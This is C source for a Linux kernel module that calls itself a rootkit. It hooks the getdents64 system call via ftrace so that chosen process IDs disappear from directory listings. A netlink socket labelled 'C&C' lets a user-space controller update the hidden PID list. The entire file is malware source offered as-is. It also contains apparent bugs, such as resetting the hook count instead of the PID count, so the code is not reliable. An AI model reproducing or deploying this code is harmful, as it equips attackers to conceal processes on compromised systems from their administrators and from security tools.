#include <linux/version.h>
#include <linux/module.h>

//include for communication
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <net/sock.h>

#include <linux/dirent.h>
#include "utility.h"
#include "hook.h"

static char str_PIDs[PAGE_SIZE] = "2215";
static int number_of_pids = 1;

// Hook
asmlinkage int hook_getdents64(const struct pt_regs *regs);

static struct ftrace_hook hooks[] = {
    // HOOK("__x64_sys_getdents64",  hook_getdents64)
    HOOK("__x64_sys_getdents64", hook_getdents64)
};
static int number_of_hooks = 1;

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *udirp = (struct linux_dirent64*) regs->si;
    int ret = ((int (*) (const struct pt_regs *)) hooks[0].address)(regs);
    if (ret <= 0)
        return ret;
    
    struct linux_dirent64* kdirp = kzalloc(ret, GFP_KERNEL);
    if (kdirp == NULL)
        return ret;

    if (copy_from_user(kdirp, udirp, ret))
    {
        kfree(kdirp);
        return ret;
    }

    int offset;
    int i;
    char* pid;
    struct linux_dirent64* current_dir = kdirp;
    for (offset = 0; offset<ret;)
    {
        pid = str_PIDs;
        current_dir = (void*) kdirp + offset;
        for (i = 0; i<number_of_pids; i++)
            if (strcmp(current_dir->d_name, pid) == 0)
            {
                // move next->end to current
                memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret-((unsigned long)current_dir-(unsigned long)kdirp));
                ret -= current_dir->d_reclen;
                printk(KERN_INFO "%d\n", ret);
                break;
            }
        if (i == number_of_pids)
            offset += current_dir->d_reclen;
    }

    copy_to_user(udirp, kdirp, ret);
    kfree(kdirp);
    return ret;
}

static int init_hook(void)
{
    printk("initalizing hooks\n");
    int i, err;
    for (i=0; i<number_of_hooks; i++)
    {
        err = fh_install_hook(&hooks[i]);
        printk("hook %s -> %d\n", hooks[i].name, err);
        if (err)
        {
            printk("unhook %s -> %d\n", hooks[i].name, fh_remove_hook(&hooks[i]));    
            return -1;
        }
    }
    return 0;
}

static int clean_hook(void)
{
    int i;
    for (i=0; i<number_of_hooks; i++)
        printk("unhook %s -> %d\n", hooks[i].name, fh_remove_hook(&hooks[i]));
    return 0;
}

// C&C
#define NETLINK_USER 31
#define MAX_PAYLOAD 1000
struct sock* nl_socket = NULL;

static void nl_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh_in;
    int port_id, len;

    // Receive
    nlh_in = (struct nlmsghdr*) skb->data;
    port_id = nlh_in->nlmsg_pid;
    len = nlh_in->nlmsg_len - sizeof(struct nlmsghdr);
    printk(KERN_INFO "Netlink received %d byte(s)\n", len);
    memcpy(str_PIDs, NLMSG_DATA(nlh_in), len);
    number_of_hooks = 0;
    char* p = str_PIDs;
    while (strlen(p)>0)
    {
        number_of_hooks++;
        p += strlen(p)+1;
    }
    printk("hid %d pids\n", number_of_hooks);
    
    // Send
    char msg[MAX_PAYLOAD];
    if (sprintf(msg, "Hello %d from kernel", port_id) <0)
    {
        printk(KERN_ERR "Failed to initalize new message\n");
        return;
    }
    int msg_size = strlen(msg);
    struct sk_buff *skb_out = nlmsg_new(msg_size, 0);
    if (!skb_out)
    {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }
    struct nlmsghdr *nlh_out = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    NETLINK_CB(skb_out).dst_group = 0;
    strncpy(nlmsg_data(nlh_out), msg, msg_size);
    if (nlmsg_unicast(nl_socket, skb_out, port_id) < 0)
        printk(KERN_INFO "Error while sending back to user\n");
}

static int init_netlink(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,6,0)
    struct netlink_kernel_cfg cfg = {
        .input = nl_recv_msg,
    };
    nl_socket = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    printk("&init_net: %p\n", &nl_socket);
    printk("nl_socket: %p\n", nl_socket);
#else
    nl_socket = netlink_kernel_create(&init_net, NETLINK_USER, 0, nl_recv_msg, NULL, THIS_MODULE);
#endif
    if (!nl_socket)
        return -1;
    return 0;
}

// Main
static int __init rootkit_init(void)
{
    printk("Initalizing rootkit\n");

    if (init_hook() < 0)
    {
        printk("Error hooking.\n");
        return -10;
    }

    if (init_netlink() < 0)
    {
        printk("Error creating socket.\n");
        clean_hook();
        return -10;
    }
    
    return 0;
}

static void __exit rootkit_exit(void)
{
    netlink_kernel_release(nl_socket);
    printk(KERN_INFO "purged\n");
    clean_hook();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");